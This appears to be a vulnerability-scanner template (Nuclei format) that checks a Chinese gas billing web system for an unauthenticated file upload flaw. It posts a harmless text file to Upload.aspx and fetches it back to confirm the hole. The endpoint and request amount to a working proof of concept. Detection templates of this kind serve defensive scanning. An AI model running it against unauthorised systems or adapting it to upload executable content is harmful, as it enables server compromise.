id: poc-yaml-pioneer-gas-charging-system-upload-aspx-file-upload
info:
  name: 先锋WEB燃气收费系统 Upload.aspx 文件上传漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload

variables:
  t1: "{{md5(rand_int(1000, 10000))}}"

flow: |
  http(1) && http(2)

http:
  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/AjaxService/Upload.aspx"
    headers:
      Content-Type: multipart/form-data; boundary=---------------------------361231835115122267584155400789
    body: |-
      -----------------------------361231835115122267584155400789
      Content-Disposition: form-data; name="Fdata"; filename="test.txt"
      Content-Type: application/octet-stream

      {{t1}}

      -----------------------------361231835115122267584155400789
      Content-Disposition: form-data; name="submit"

      Submin
      -----------------------------361231835115122267584155400789--
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "UploadFile"
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: t2
        group: 1
        regex:
          - "([0-9]{6})"
        internal: true
      - type: regex
        name: t3
        group: 1
        regex:
          - "([0-9]{16})"
        internal: true

  - id: validate-upload
    method: GET
    path:
      - "{{BaseURL}}/UploadFile/{{t2}}/{{t3}}.txt"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{t1}}"
      - type: word
        part: body
        words:
          - "<"
        negative: true
      - type: status
        status:
          - 200
